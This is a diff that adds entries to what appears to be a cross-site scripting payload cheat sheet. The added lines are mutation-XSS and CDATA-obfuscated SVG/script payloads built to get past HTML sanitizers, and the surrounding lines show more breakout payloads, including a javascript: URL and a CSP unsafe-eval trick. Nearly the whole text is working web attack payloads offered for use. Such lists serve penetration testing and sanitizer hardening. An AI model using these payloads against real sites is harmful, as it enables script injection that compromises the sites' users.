@@ -37,6 +37,13 @@ javascript:alert%28%27Slonser%20was%20here%21%27%29%3B%2F%2F@target.com#;alert(1
 setTimeout('alert(1)') 		// if unsafe-eval rule is added to the csp 
 
 //mutation xss **some of these payloads are not technically mutation. and even the ones that are technically are not because the browsers fixed the mutation behavior. Regardless these are great payloads the SVG/style tags are great for xss.
+
+<svg><a><foreignobject><a><table><a></table><style><!--</style></svg><a id="-><img src/onerror=alert()>">
+<noscript><p title="</noscript><img src/onerror=alert()>">
+
+<svg><script><![CDATA[a]]><![CDATA[l]]><![CDATA[e]]><![CDATA[r]]><![CDATA[t]]><![CDATA[(]]><![CDATA[1]]><![CDATA[)]]></script>
+<svg><script>/*<![CDATA[*]]><![CDATA[/]]>alert(1)-/\*/</script>
+<svg><script>1<![CDATA[</script>]]>/-alert(1)</script></svg>
 <svg></p><style><a id="</style><img/src=1 onerror=alert(1)>">
 <svg></textarea></p><style><a id="</style><img/src="1"/onerror=alert(1)>"></textarea></style></svg>
 <style><a id="</style><img src=x onerror=alert(1)>"></a></style>
